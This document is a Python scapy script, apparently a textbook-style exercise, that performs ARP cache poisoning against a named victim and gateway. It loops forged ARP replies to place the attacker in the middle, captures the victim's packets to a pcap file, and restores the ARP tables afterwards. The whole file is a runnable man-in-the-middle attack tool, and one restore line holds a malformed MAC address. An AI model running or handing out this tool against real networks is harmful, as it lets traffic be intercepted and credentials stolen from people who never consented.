from multiprocessing import Process
from scapy.all       import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)

import argparse
import os
import subprocess
import sys
import time

def discover(network):
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network),timeout=2)
    ans.summary(lambda s,r: r.sprintf("%ARP.psrc% %Ether.src%"))

def get_mac(targetip):
    # ARP Ping to discover hosts
    packet  = Ether(dst = 'ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip) # op=1=ARP Request
    #print(packet.command())
    ans, unans = srp(packet, timeout=2, retry=10, verbose=False)  # Send/receive packets on L2  
    # Returns two lists  with Results and Answer, example: <Results: TCP:0 UDP:0 ICMP:0 Other:1> <Unanswered: TCP:0 UDP:0 ICMP:0 Other:0>
    # print(unans.summary())
    for unans, r in ans:
        return r[Ether].src
    return None

class Arper:

    def __init__(self, victim, gateway, interface):
        self.victim     = victim
        self.victimmac  = get_mac(victim)
        self.gateway    = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface  = interface
        # Configuration is saved in the session
        conf.iface      = interface
        # level of verbosity
        conf.verb       = 0
        print(f"Initalized {interface}:")
        print(f"Gateway {gateway} is at {self.gatewaymac}")
        print(f"Victim  {victim} is at {self.victimmac}")
        print('><(((º> '*15)        

    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        # Allows to watch the attack in progress 
        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        '''Create poisoned packets and send them to the victim and the gateway'''
        poison_victim       = ARP()
        poison_victim.op    = 2   # ARP Reply
        poison_victim.psrc  = self.gateway
        poison_victim.pdst  = self.victim
        poison_victim.hwdst = self.victimmac
        print(f'Gateway,  IP source:        {poison_victim.psrc}')              # Gateway's IP address
        print(f'Victim,   IP destiantion:   {poison_victim.pdst}')
        print(f'ATTACKER, MAC source:       {poison_victim.hwsrc}')            # Attacker's MAC address
        print(f'Victim,   MAC destination:  {poison_victim.hwdst}')
        print(poison_victim.summary())
        print('~*~'*15)

        poison_gateway       = ARP()
        poison_gateway.op    = 2 
        poison_gateway.psrc  = self.victim
        poison_gateway.pdst  = self.gateway
        poison_gateway.hwdst = self.gatewaymac
        print(f'Victim,   IP source: {poison_gateway.psrc}')              # Victim's IP address
        print(f'Gateway,  IP destiantion: {poison_gateway.pdst}')
        print(f'ATTACKER, MAC source: {poison_gateway.hwsrc}')            # Attacker's MAC address
        print(f'Gateway,  MAC destination: {poison_gateway.hwdst}')
        print(poison_gateway.summary())
        print('><(((º> '*15)

        print(f'Begin the ARP poison. [CTRL-C to stop]')
        # Respective's ARP caches entires remain posioned
        while True:
            # Dynamic packet printing:
            sys.stdout.write('.')           # Waiting on the terminal
            sys.stdout.flush()              # Flushes out the stdout buffer: it'll write everything in the buffer to the terminal
            try:
                # Attacker's NIC should allow IP Forwarding
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                # Restore ARP cache entires 
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    def sniff(self, count=200):
        ''' Sniffs the poisoning attack '''
        time.sleep(5)                       # Allows the poisoning thread to start
        print(f'Sniffing {count} packets')
        bpf_filter = "ip host %s" % self.victim
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap('arper.pcap', packets)       # Write a list of packets to a pcap file
        print('Got the packets')
        self.restore()
        self.poison_thread.terminate()
        print('Finished.')

    def restore(self):
        print('Restoing ARP tables...')
        send(ARP(
            op    = 2,
            psrc  = self.gateway,
            hwsrc = self.gatewaymac,
            pdst  = self.victim,
            hwdst = 'ff:ff:ff:ff:ff:ff'),
            count = 5)
        send(ARP(
            op    = 2,
            psrc  = self.victim,
            hwsrc = self.victimmac,
            pdst  = self.gateway,
            hwdst = 'ff:ff:ff:ff:ff"ff'),
            count = 5)

if __name__ == '__main__':

    parser = argparse.ArgumentParser(
        usage = "./arper.py <victim> <gateway> <interface> [options] -d <IP/subnet>",
        description = " Your good ol' ARP poisoner."
    )
    parser.add_argument("victim",    nargs ='?',  default=argparse.SUPPRESS, help = "Input the victim's IP address")
    parser.add_argument("gateway",   nargs ='?',  default=argparse.SUPPRESS, help = "Input the gateway to spoof")
    parser.add_argument("interface", nargs = '?', default=argparse.SUPPRESS, help = "Input a NIC")
    parser.add_argument("-d", "--discover", action ="store", type=str, dest="discover",  help = "Enter <IP_Network>/<subnet>")
    args = parser.parse_args()
    
    if args.discover:
        myarp = discover(args.discover)

    else:
        try:
            myarp = Arper(args.victim,args.gateway,args.interface)
            myarp.run()
        except AttributeError as e:
            print("Not today, Satan: %s" %e)